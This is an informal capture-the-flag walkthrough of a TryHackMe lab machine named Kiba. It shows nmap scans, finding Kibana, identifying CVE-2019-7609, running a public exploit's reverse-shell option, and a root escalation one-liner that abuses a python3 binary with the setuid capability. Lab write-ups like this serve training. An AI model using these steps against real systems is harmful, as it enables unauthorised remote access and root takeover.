Upon logging in we got this classic puzzle of cryptography the butterfly image which is a classic crytographic puzzle that is unsolved yet.

here is our first look of the target.

![img](https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-28-26.png)

After it we started our directory enumuraiton on the target.

And it gave me no any endpoint except the /index.html



Then we did our namp

It was our output from nmap

From the scan 
nmap -sV -A -O -Pn 10.48.140.152

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Then i looked for cookies or sesssid but nothing was created by the application.

then i checked for response header everythign is normal look below 

< HTTP/1.1 200 OK
< Date: Sat, 30 May 2026 14:14:18 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Wed, 01 Apr 2020 05:55:37 GMT
< ETag: "50b-5a23455559875"
< Accept-Ranges: bytes
< Content-Length: 1291
< Vary: Accept-Encoding
< Content-Type: text/html

Then i cheked for supported method they were 

< Allow: GET,HEAD,POST,OPTIONS


But soon when i send the get req it was ok


When we sent post req it seems okay too


But wehn we send the HEAD req the response took exactly 5 sec to come.

I tried the subdomain enumuraiton too with the largest enumuraiton file.

But then i went to nmap again and found that there is another port opened that was

5601/tcp open esmagent

it was spotted with nmap -p- <TARGET>


As we went to the question 

What is the vulnerability that is specific to programming languages with prototype-based inheritance?

This told me that that answer with a simple google search result that gave us the answer.

As the next question asks us that 

What is the version of visualization dashboard installed in the server?

its answer could be seen at the endpoint

http://10.48.140.152:5601/app/kibana#/management?_g=()

The version will be clearly visible on this page.

As we move on to our next question that is

What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

As for this question we know the version of the kibana so we will search for a exploit for it in other words lets say cve.

After we did  seach for a cve and found that it was CVE-2019-7609.


I googled this exploit name and found a exploit for it at 

https://github.com/LandGrey/CVE-2019-7609

As oer the usage instruction 

```python
# python2 CVE-2019-7609-kibana-rce.py -h

usage: CVE-2019-7609-kibana-rce.py [-h] [-u URL] [-host REMOTE_HOST]
                                   [-port REMOTE_PORT] [--shell]

optional arguments:
  -h, --help         show this help message and exit
  -u URL             such as: http://127.0.0.1:5601
  -host REMOTE_HOST  reverse shell remote host: such as: 1.1.1.1
  -port REMOTE_PORT  reverse shell remote port: such as: 8888
  --shell            reverse shell after verify

```

I use the commadn and in the another terminal opend the listener and as i did enter with correct syntax i got the shell.

And the flag was at usual location that is /home/kiba/user.txt

And as the next question was asking that 

How would you recursively list all of these capabilities?

I googled it with some other info that too was provided in room i google the below term exactly

```search
Capabilities is a concept that provides a security system that allows "divide" root privileges into different value How would you recursively list all of these capabilities?
```

And i got the answer that is getcap -r /.

As we execute the commadn 

getcap -r / 2>/dev/null

On that shell i got teh below result 

/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
 

the interesting one was /home/kiba/.hackmeplease/python3 = cap_setuid+ep

To do privilage escalation using this it was the commadn 



```python3

python3 -c 'import os; os.system("/bin/sh")'


Then the below


/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

after the execution of this commadn i got the root access and able to read the root flag at the location /root/root.txt


